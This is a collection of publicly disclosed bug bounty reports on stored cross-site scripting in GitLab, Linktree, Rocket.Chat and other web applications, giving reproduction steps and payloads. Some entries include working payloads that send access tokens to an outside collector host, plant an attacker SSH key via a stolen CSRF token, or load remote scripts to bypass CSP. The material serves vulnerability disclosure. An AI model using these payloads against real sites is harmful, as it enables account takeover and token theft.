The [Stored-XSS with CSP-bypass via labels' color](https://hackerone.com/reports/1665658) has been mitigated in [Gitlab 15.3.2](https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#stored-xss-via-labels-color). However it is not enough because it missed the case of [scoped label](https://gitlab.com/gitlab-org/gitlab/-/blob/85041966ed3eba23ee530a20c2eee374ef6e8617/ee/app/helpers/ee/labels_helper.rb#L33).

I notified this missing in the [original report](https://hackerone.com/reports/1665658#activity-18273269) and @galfaro encouraged me to submit a new report about this.


# Step to reproduce:

- To reproduce, we need the following prerequisites:

   + [Scoped labels](https://docs.gitlab.com/ee/user/project/labels.html#scoped-labels) are available in Gitlab Premium, so we need a premium account that can be obtained via the [free trial](https://about.gitlab.com/free-trial/)
   + A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.

- Github does not allow to create arbitrary label colors. You can find in the attachment a dummy Github server in which we set a new label:
   + name: `yvvdwf::label-name` (the `::` to scope the label)
   + color: `">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>`

- To easily reproduce, I'm hosting the dummy Github server at my own VPS, `http://51.75.74.52:11211`, I will shut it down once you validated the report.

- Open a new terminal, then run the following command, in which:
   + `$GL_TOKEN` is the the api token you've created above
   + `yvvdwf-group-a` is a group (or account) name having premium features


For example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: $GL_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf-group-a",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:11211"
}'
```

- After finishing, you can view the list of the label of the imported project. You should see a popup created by this javascript `alert(document.domain)`

- Since we can control the label color, we can create a Stored-XSS with CSP-bypass on another place rather than the page that lists the labels, such as, an issue or a merged request of another project by using [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

# Example:

- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels
- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1

# Output of checks

This bug happens on GitLab.com

# Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

Beside that, I would like to clarify some other metrics in the CVSS (the text in **bold** is copied from [your cvss calculator](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator) )

- `AC:L`: **Stored XSS on a page that's part of the user's normal workflow (issue or merge request page)**: As I mentioned above the store-XSS is on the issue/MR requests of a project the attack may create an issue/MR
- `PR:N`: **The attacker is logged out - PR:N - but the victim is logged in**: The stored-XSS still exist even the attacker is logged out. 
- `C:H`: **Access tokens, runner tokens. Private repositories**: Indeed the XSS allows to execute any Rest API on behalf of the victim to get almost arbitrary private information of the victim (unless his password). It can even perform a *fake* account-take-over by changing the victim's username and immediately register a new account within the victim's username (as changing username does not require to confirm password)
- `A:L`: This Store-XSS with CSP-bypass can easily create DoS at the client side by exhausting CPU and RAM of the victim's Web browser. It can also be used to send as much as possible the requests to the server. The number of requests can increase by the number of victims who are viewing the XSS.

Best regards,

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

---

### [Cross-site scripting on algorithm collaborator ](https://hackerone.com/reports/615672)

- **Report ID:** `615672`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Quantopian
- **Reporter:** @irisrumtub
- **Bounty:** 2100 usd
- **Disclosed:** 2022-12-21T20:12:27.620Z
- **CVE(s):** -

**Vulnerability Information:**

Hi again my favorite VDP team. I bring you 8th bug and 4th cross-site scripting. Currently trying to upload python code via self-serve data, not looking for XSS'es only, but they're a thing still, right?

**Summary:**
By sending specially crafted websockets request attacker can run javascript in algorithm collaborator's web browser

**Description:**
This is actually quite a funny bug. Some time ago when I was testing algo debugger, i noticed that there is a request to */algorithms/algoid/x* which usually happens when i try to insert html's <img src=x>. But since some time your cloudflare became more strict and adding inline scripts in request might result in 403 Forbidden, so i remove them and try without them. But at that time i couldn't find the image that caused that request. I sent that to Chris.
Today i was trying to test against debugger again. The purpose wasn't to find XSS, but i spammed XSS payloads alongside with some different stuff. And again that request to page *X*. And i noticed that debugger removed part of my payload which contained image. That's it! That should be the vulnerable place. 
However typing html entity in it didn't produce anything. And html was injected only on my side, not the other collaborator's. So i decided to take a look at the websocket request that sends it
It turned out that HTML's <> and other entities were encoded. So i tried intercepting the websockets request and enter <img src=x onerror=alert(1)> and it worked not only on me, but on collaborator as well.
So is it TogetherJS library that is in charge of websockets? I think you might need to encode payloads server-side to avoid this kind of things. I would be glad to help you test the fix for this.


## Steps To Reproduce:


  1. Intercept websockets message like this (debugger input update)
{F509648}
  2. Replace value with raw html/javascript
  3. Send the message. Payload will work in collaborator's browser


## Test account information

irisrumtub+hackerone@mail.ru
tvburis+hackerone@gmail.com

## Impact

Run javascript in victim's browser

---

### [New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields](https://hackerone.com/reports/1578400)

- **Report ID:** `1578400`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @cryptopone
- **Bounty:** 13950 usd
- **Disclosed:** 2022-11-16T01:07:35.198Z
- **CVE(s):** CVE-2022-1948

**Vulnerability Information:**

### Summary

In Gitlab 15.0.0 a new Customer Relations feature was added that allows us to use quick actions to find the contact we wish to select.

However, I noticed that if I set the contact's first name or last name to <script>alert(document.domain)</script> we can get the XSS to trigger when we are attempting to use the quick commands to add/remove a contact.

### Steps to reproduce

1. Create a new group.
1. Once the group is created, navigate to the Settings -> General options for the group.
1. Expand the section "Permissions and group features" and under "Customer Relations" make sure "Enable customer relations" is selected.
1. Return back to the group page. On the left side of the screen a new menu option will appear titled "Customer relations". Select it.
1. Create a new contact with "First name" set to "`<script>alert(document.domain)</script>`" and "Last name" set to "`<script>alert(document.domain)</script>`". Provide an email address and save your changes.
1. The user you created in the previous step should now appear as a contact on the Customer Relations page.
1. Go to the create new project URL (https://gitlab.com/projects/new#blank_project) and under Project URL, select the Group you created earlier. Give the project a name Ex. "CustomerProject".
1. Once the project has been created on the left side of the project page select "Issues" and then click "New Issue".
1. In the description pane type "/add_contacts" so the popup appears, then press "enter" to trigger the XSS.

### Impact

Users attempting to utilize the quick commands /add_contacts or /remove_contacts could inadvertently trigger XSS while attempting to add/remove a customer to an issue.

### Examples

This bug was discovered originally on my self-hosted 15.0.0 but is reproducible on gitlab.com.

Create a contact with the payload in firstname and lastname fields
{F1740002}

Create a new issue and type "/add_contacts" in the markdown text area to trigger the popup to appear
{F1740003}

Press enter, which will trigger the XSS when attempting to load the list of contacts
{F1740004}

### What is the current *bug* behavior?
The HTML special characters are not escaped, allowing an iframe to be injected into the page with XSS.

### What is the expected *correct* behavior?

The HTML special characters would be escaped and shown in the diagram.

### Output of checks

This bug is reproducible on Gitlab.com

#### Results of GitLab environment info

```System information
System:         Ubuntu 20.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.5p203
Gem Version:    3.1.4
Bundler Version:2.2.33
Rake Version:   13.0.6
Redis Version:  6.2.6
Sidekiq Version:6.4.0
Go Version:     unknown

GitLab information
Version:        15.0.0-ee
Revision:       3b397c17532
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.10
URL:            http://gitlab-pentest4.example.com
HTTP Clone URL: http://gitlab-pentest4.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab-pentest4.example.com:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        14.3.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell```

## Impact

JavaScript execution as the authenticated user when the user attempts to add or remove a contact for the new customer relations feature.

---

### [XSS in SocialIcon Link](https://hackerone.com/reports/1698652)

- **Report ID:** `1698652`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Linktree
- **Reporter:** @sudi
- **Bounty:** - usd
- **Disclosed:** 2022-10-31T04:04:54.211Z
- **CVE(s):** -

**Summary (team):**

XSS in SocialIcon Link

**Summary (researcher):**

There was no validation of the url provided for the SocialIcon Link , which allowed to include javascript uri .
As the cookies were marked as httponly , I couldn't steal them directly via the xss so instead I found an endpoint which was leaking the accessToken used for authentication.

```js
await fetch("https://linktr.ee/api/token", {
    "credentials": "include",
    "method": "GET"
})
.then((response) => response.json())
.then((responseJson) => {
    fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);
})
```

Final POC:

```js
javascript://https://amazon.com/shop/x%0Aeval(\"(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()\")
```

POC in action:
https://youtu.be/598GUqKrNvw

---

### [Persistent CSS injection with ’marked’ markdown parser in Rocket.Chat](https://hackerone.com/reports/1401268)

- **Report ID:** `1401268`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @danieljpp
- **Bounty:** - usd
- **Disclosed:** 2022-09-22T16:00:42.349Z
- **CVE(s):** CVE-2022-35251

**Summary (team):**

**Summary:** Rocket.Chat offers two different markdown parsers out of the box: the ’orginal’ one and the ’marked’ one. Both markdown parsers offer a different set of features with different re- strictions. Due to more loose restrictions in the ’marked’ parser, a persistent CSS injection in the web interface of Rocket.Chat is possible.

**Description:** Due to style injection in the complete chat window, an adversary is able to manipulate not only the style of it, but will also be able to block functionality as well as hijacking the content of targeted users. Hence the payloads are stored in messages, it is a persistent attack vector, which will trigger as soon as the message gets viewed.

## Releases Affected:

  * 4.1.0 with 'marked' parser

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1. Setup a new installation of Rocket.Chat
  2. Enable the 'marked' parser in the admin settings under 'Message' > 'Markdown' > 'Markdown Parser'
  3. Create a second user account with username `usertest` and a channel containing both accounts
  4 . Send some messages between both accounts
  5. Send 
```html
<div style="position: fixed; top: 6px; right: 0px; height: 50px; width: 400px; background: rgb(255,0,0); z-index: 3">foobar</div>
```
This should block the top right channel settings with a red box.
  6. Send
```html
foo
<style >
[data-username="usertest"] div div p{
    background: rgba(255, 0, 0, 0.2);
    font-size: 0;
}
[data-username="usertest"] div div p::after{ font-size: initial;
    content: "hacked";
}
</style>
```
as admin user and observe, that the messages of 'usertest' are overwritten with the content 'hacked'. (It can be done vice versa when replacing 'usertest' in the payload with the admins username).

## Supporting Material/References:

 ### Root Cause

The implementation of the ’marked’ render removes html encoding of the message right before rendering it in `app/markdown/lib/parser/marked/marked.js` line 98.

```js
	message.html = _marked(unescapeHTML(message.html), {
		gfm,
		tables,
		breaks,
		pedantic,
		smartLists,
		smartypants,
		renderer,
		highlight,
	});

	const window = getGlobalWindow();
	const DomPurify = createDOMPurify(window);
	message.html = DomPurify.sanitize(message.html, { ADD_ATTR: ['target'] });
```

Due to the unscape, the user will be able to inject custom HTML elements. Since `DomPurify.sanitize` will only sanitize XSS relevant elements and properties, the malicious HTML with the CSS injection will be set into the user’s message.


## Suggested mitigation

To avoid the style injection, but still allow the usage of custom tags, DomPurify.sanitize could be configured to also remove style elements and attributes. Another way to mitigate the issue would be to not unescape the html before rendering it with ’marked’ to therefore prohibit the user to use custom HTML in their messages.

## Impact

An attacker can block the user from certain functionalities as well as render the chat window unusable (e.g. with a rotation of the complete html body) after the user enters a channel. Another impact of the issue is the authenticity and integrity of messages. Since an adversary will be able to manipulate or hide arbitrary user messages, the authenticity and integrity is not given anymore. These attack vectors are stored in messages, which will make them available for every new user entering the channel.

## Fix

Fixed in 5.0>

---

### [STORED XSS in █████████/nlc/login.aspx via "edit" GET parameter through markdown editor [HtUS]](https://hackerone.com/reports/1631447)

- **Report ID:** `1631447`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @shreky
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T21:13:53.142Z
- **CVE(s):** -

**Vulnerability Information:**

While looking through the source code of https://████████/nlc/login.aspx,I noticed this line (204):
`<a id="ctl00_ContentPlaceHolder1_CancelButton" class="hidden" href="login.aspx?edit=false"><i class="fa fa-times"></i> Cancel</a>`  ,which exposes the **edit** GET parameter.
Upon accessing https://█████████/nlc/login.aspx?edit=true ,a hidden markdown editor will be revealed if you click around where the bottom text is,which allow us to input our own text,upload images,and pretty much anything you can do in markdown.  
████████  
As you can see to prove impact,I inputted an XSS payload(`svg/onload=alert(1)>`) and clicked on **Save**.
After that whenever **anyone** accesses https://██████████/nlc/login.aspx ,the XSS payload will execute.  
███████  
The only way to remove the XSS payload is through accessing the markdown editor through https://█████████/nlc/login.aspx?edit=true ,removing it,and saving it.

## Impact

Using this,an attacker is able to input and execute his own javascript code that will execute on **everyone** that accesses the login page **every time**,no matter what device they're using.They are not limited to Stored XSS though,using the hidden markdown editor they're able to upload images,deface the website and basically anything you can using markdown,however the most impactful scenario being executing arbitrary javascript code.

---

### [Stored XSS at https://█████](https://hackerone.com/reports/1620247)

- **Report ID:** `1620247`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r0x0rz
- **Bounty:** - usd
- **Disclosed:** 2022-09-06T19:04:09.997Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
In registeration page ( https://████ ) , first name and last name field are vulnerable to Stored Cross Site Scripting.

## Proof of concept
For the fastly test, use this credentials to login (my test account)
> email: █████████
password: ██████

After login , alert document.cookie will triggered

## Impact

Stored Cross Site Scripting which attacker can execute malicious javascript payload.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to registration page ( https://████ ), insert `<svg/onload=confirm(document.cookie)>` payload in firstname and lastname fields and create account.
2. Verified your account.
3. Go to login page and login your account.
4. And XSS will triggered ( XSS also triggered in `My Profile` page) .

## Suggested Mitigation/Remediation Actions
1. Filter input on arrival.
2. Encode data on output.
3. Content Security Policy

---

### [Stored XSS for Grafana dashboard URL](https://hackerone.com/reports/684268)

- **Report ID:** `684268`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @xanbanx
- **Bounty:** - usd
- **Disclosed:** 2022-07-13T15:12:56.383Z
- **CVE(s):** -

**Vulnerability Information:**

Hi GitLab Security Team 

### Summary

I found a stored XSS vulnerability in the admins page. The administrator can set up a Grafana dashboard. Here, the administrator can either enter a relative URL or an absolute address. However, when adding an absolute URL, the protocol is not checked allowing to add a Javascript payload. However, when clicking on the URL, the corresponding `<a>` contains the `target="_blank"` attribute, which means a new tab is opened. However, by exploiting the `window.opener` attribute, I still can access the original tab allowing me to steal for example the CSRF token.

### Steps to reproduce

Tested locally on GitLab Enterprise 12.3.0-pre 7e45734123b

1. As an administrator go to `http://example.gitlab.com/admin/application_settings/metrics_and_profiling#js-grafana-settings`
2. Enter the following payload `javascript:alert(window.opener.document.location)`
3. Within the admin sidebar open `Monitoring ->  Metrics Dashboard`

See the the Javascript being executed

### Impact

Stored Javascript code is being executed on behalf of another user's session. Although this is only visible within the admins page, it's severity is the same. A malicious administrator can attack other administrator users with that. For example, the CSRF token can be stolen allowing, i.e., to add the attacker's SSH key to the victims user account. This can be done for example using the following payload:

```
javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });
```

### What is the current *bug* behavior?

The URL entered in the Grafana domain is not validated allowing arbitrary javascript being entered.

### What is the expected *correct* behavior?

The URL input field should only allow valid URLs for http(s).

### Relevant logs and/or screenshots

(Paste any relevant logs - please use code blocks (```) to format console output,
logs, and code as it's very hard to read otherwise.)

### Output of checks

#### Results of GitLab environment info

```
System information
System:         Ubuntu 18.04
Proxy:          no
Current User:   xanbanx
Using RVM:      no
Ruby Version:   2.6.3p62
Gem Version:    3.0.3
Bundler Version:1.17.2
Rake Version:   12.3.2
Redis Version:  4.0.9
Git Version:    2.23.0
Sidekiq Version:5.2.7
Go Version:     go1.12.6 linux/amd64

GitLab information
Version:        12.3.0-pre
Revision:       7e45734123b
Directory:      /home/xanbanx/gdk/gdk-ee/gitlab
DB Adapter:     PostgreSQL
DB Version:     10.10
URL:            http://localhost:3001
HTTP Clone URL: http://localhost:3001/some-group/some-project.git
SSH Clone URL:  ssh://xanbanx@localhost:2222/some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers: 

GitLab Shell
Version:        9.4.1
Repository storage paths:
- default:      /home/xanbanx/gdk/gdk-ee/repositories
GitLab Shell path:              /home/xanbanx/gdk/gdk-ee/gitlab-shell
Git:            /usr/bin/git

```

Best,
Xanbanx

## Impact

See above

---

### [Stored XSS on issue comments and other pages which contain notes](https://hackerone.com/reports/1398305)

- **Report ID:** `1398305`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @jarij
- **Bounty:** 3000 usd
- **Disclosed:** 2022-06-08T14:02:11.747Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

This report contains two XSS sanitization bypasses:

* The [SyntaxHighlightFilter](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb) creates html from unsanitized data. This can be used to bypass the XSS filter on the server-side. 

```ruby
 def highlight_node(node)
...
sourcepos = node.parent.attr('data-sourcepos')
...
sourcepos_attr = sourcepos ? "data-sourcepos=\"#{sourcepos}\"" : ""

 highlighted = %(<pre #{sourcepos_attr} class="#{css_classes}"
                             lang="#{language}"
                             #{lang_params}
                             v-pre="true"><code>#{code}</code></pre>)
```

* The [gl-emoji](https://gitlab.com/gitlab-org/gitlab/-/blob/5b0bedde99d676116221b56ad75fa89ccf8a9f28/app/assets/javascripts/behaviors/gl_emoji.js) custom element can be used to bypass the gitlab-ui `v-safe-html` directive sanitization on the frontend side by injecting the payload into the name attribute:

```js
export function emojiImageTag(name, src) {
  return `<img class="emoji" title=":${name}:" alt=":${name}:" src="${src}" width="20" height="20" align="absmiddle" />`;
}
```

* Gitlab SaaS is not vulnerable because this report does not include CSP bypass. I'm currently working on this.

### Steps to reproduce

{F1510920}

1. Launch self-managed Gitlab instance
2. Create issue
3. Copy and paste the following payload into the comment field:

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

#### Results of GitLab environment info

```
# gitlab-rake gitlab:env:info         

System information
System:
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.4p191
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.6
Redis Version:  6.0.16
Git Version:    2.33.0.
Sidekiq Version:6.2.2
Go Version:     unknown

GitLab information
Version:        14.4.2-ee
Revision:       84aa6daaffd
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.7
URL:            http://localhost:8888
HTTP Clone URL: http://localhost:8888/some-group/some-project.git
SSH Clone URL:  git@localhost:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.21.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

Attacker who can comment on issue will be able to XSS users that visit that issue. This also affects other pages where comments can be posted, such as snippets.

---

### [Stored XSS in Notes (with CSP bypass for gitlab.com)](https://hackerone.com/reports/1481207)

- **Report ID:** `1481207`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 13950 usd
- **Disclosed:** 2022-05-25T12:09:13.538Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
I read the issue [345657](https://gitlab.com/gitlab-org/gitlab/-/issues/345657) which handles the XSS in notes reported in Hackerone report [1398305](https://hackerone.com/reports/1398305). This issue fixes the reported XSS but leaves the HTML injection that was also mentioned. I don't know how you deal with these situations, but I thought I report this, and you can decide :)

The issue linked above shows how a user can inject HTML in any Note (actually any Markdown it seems. For example wiki pages and issue descriptions) by abusing [syntax_highlight_filter.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/c2e5d7b89b84cc5b44575592bb706ef75c3d1bbb/lib/banzai/filter/syntax_highlight_filter.rb).

There are more ways to take this injection and weaponize it than the patched Emoji tag. I have a list of additional vectors but though that I would report the worst one (proper full stored XSS) and explain more if you decide to accept the report. To not waste our time.

I have multiple ways to inject `script` tags, but it looks like you have hardened your CSP? None of the old bypasses worked for me. But it still seems that you have not blocked the `base` tag. And fortunately for me, the injection let me pass in `base` tags. So by entering this into an issue description or wiki page

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
All relative links in the page will try to load their data from my site "joaxar.com". If we then open DevTools and reload the page, we will see the name of all files that failed to load. In the case of an issue page, we have this script
```
http://joaxcar.com/assets/webpack/hello.4948f350.chunk.js
```
and for a wiki page we have
```
https://joaxcar.com/assets/webpack/top_nav.c9763726.chunk.js
```
{F1618905}

Now I just have to create these files on my domain, and they will load and bypass CSP (as these script tags will have nonce in place and can thus load anything)

{F1618900}

## Steps to reproduce
1. log in as a user on Gitlab.com
2. go to any project (or create one), and add a new issue
3. enter this as the description (replace with your own server if you need to generate new scripts on your own domain)
```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://joaxcar.com>
<pre x=&#34;">
<code></code></pre>
```
4. save the issue
5. open DevTools (f12) and look for failing script imports
6. create the missing script on your domain containing
```
alert(document.domain)
```
7. reload the page and the popup should pop

{F1618901}


### Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

### What is the current *bug* behavior?

HTML injection in Markdown

### What is the expected *correct* behavior?

Should not be possible

### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS in gitlab.com

There are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)

---

### [Cross-site scripting on dashboard2.omise.co](https://hackerone.com/reports/1532858)

- **Report ID:** `1532858`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Omise
- **Reporter:** @oblivionlight
- **Bounty:** 200 usd
- **Disclosed:** 2022-05-24T11:54:30.797Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Cross-site scripting (XSS) is an attack vector that injects malicious code into a vulnerable web application.
Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application.

Steps To Reproduce:
1. Log in to your account.
2. Visit https://dashboard.omise.co/test/settings 
3. Under Export - Specify the metadata that you want to include in your export option. Enter <script>alert(2)</script> in all four parameters including Charge, Transfer, Refund, Dispute.
4. Click on Update settings.
5. Click on Try our new dashboard, XSS will Trigger or log out and log in again, and XSS will Trigger.

POC:
Attached Video.

## Impact

Code injected into a vulnerable application can exfiltrate data or install malware on the user's machine. Attackers can masquerade as authorized users via session cookies, allowing them to perform any action allowed by the user account.

---

### [Stored XSS in photos_user_map.gne](https://hackerone.com/reports/1534636)

- **Report ID:** `1534636`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Flickr
- **Reporter:** @keer0k
- **Bounty:** 3263 usd
- **Disclosed:** 2022-05-23T23:21:39.819Z
- **CVE(s):** -

**Summary (team):**

The Flickr map page was inadequately escaping the name of groups when browsing the map of a group's photos.

---

### [Blind XSS via Feedback form.](https://hackerone.com/reports/1339034)

- **Report ID:** `1339034`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Judge.me 
- **Reporter:** @b3hlull
- **Bounty:** - usd
- **Disclosed:** 2022-05-03T09:36:36.383Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hi Team,

 I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.

## Steps To Reproduce:

  1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.** (credentials in the Credentials Header)**
  1. Click the **Apps** tab from the left side and then click **Judge.me Product Reviews**.
  1. Click** Add Widgets** then **Start Installation** and continue.
  1. When the installation is done. It asks **Are you happy with how everything looks?**. Choose  **No, please remove all widgets button**. Feedback form appears and put your blind xss payload.
  1. Wait for payload triggering.

## Supporting Material/References:

Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███

Cookies:```http
██████████████ ```


## Credentials

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

 Admin Page
=====================
█████
Vulnerable Page
=====================
███████ 
Steps to Reproduce Video
=====================
████

## Impact

Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.

---

### [Stored XSS in merge request creation page through payload in approval rule name](https://hackerone.com/reports/1342009)

- **Report ID:** `1342009`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 3000 usd
- **Disclosed:** 2022-03-31T19:24:58.216Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

Hi GitLab team, I found a stored XSS in merge request creation page caused by a payload in the name of an "approval rule".

Adding approval rules is a feature that is unlocked for premium subscriptions or above. This does not seem to block it from being used against regular users on for example Gitlab.com by inviting them into the "infected project".

This occurs when adding an "Approval rule" to a project and giving it a javascript/html payload as the name and attaching the rule to an approver. When a user tries to create a merge request in the project and opens the "Reviewers" dropdown, information about the user with the attached rule will be shown and the rule name will be injected underneath.

With the payload
```
<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
```
this XSS bypasses the current CSP on Gitlab.com (tried it with an Ultimate trial and inviting a user without a trial to the project)

As I got the impression that all XSS are treated equal when reporting a similar issue, I have not made any deeper analysis of the reason for this firing. Thought I just report it right away. Please reach back to me if you need me to research the impact deeper! As an example, it does not fire when one "edits" a MR which is a bit odd...

### Steps to reproduce

1. Create two user accounts, `attacker_user` and `victim_user` (`attacker_user` must have at least premium features enabled)
2. Log in as `attacker_user`
3. Create a project `xss_project` by going to https://gitlab.com/projects/new#blank_project
4. Go to projects settings on https://gitlab.com/attacker_user/xss_project/edit and scroll down to and expand "Merge request approvals"

{F1450906}

5. Click "Add approval rule"
6. Put the payload as the name, If on Gitlab.com use
```
<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
```
if this is tested on a server without CSP feel free to use the payload
```
<script>alert(document.domain)</script>
```
7. Search for and select `attacker_user` as approver and click create rule.

{F1450905}

8. Invite `victim_user` to the project as `Developer` on https://gitlab.com/attacker_user/xss_project/-/project_members
9. Log out and log back in as `victim_user`
10. Go to https://██████████/user_01/pub/-/branches/new and create a branch `new`
11. Directly click on "Create merge request" (which will appear on the screen)

{F1450903}

12. Click on the dropdown at "Reviewers"
13. Payload will trigger

{F1450904}


### Impact

Stored XSS with CSP bypass. Full Javascript functionality without restrictions, so everything from stealing data to generating and exfiltrating access tokens.

### Examples

If you access my private project at Gitlab.com (https://gitlab.com/ultimate-joaxcar-test3/xss) as an admin, you should be able to create an MR and trigger payload. (Just an alert box)

### What is the current *bug* behavior?

Approver rule name is injected in the user information without proper sanitization.

### What is the expected *correct* behavior?

The name should be sanitized


### Output of checks

This bug happens on GitLab.com

## Impact

Stored XSS with CSP bypass. Full Javascript functionality without restrictions, so everything from stealing data to generating and exfiltrating access tokens.

---

### [Stored XSS through PDF viewer](https://hackerone.com/reports/881557)

- **Report ID:** `881557`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Slack
- **Reporter:** @hitman_47
- **Bounty:** 4875 usd
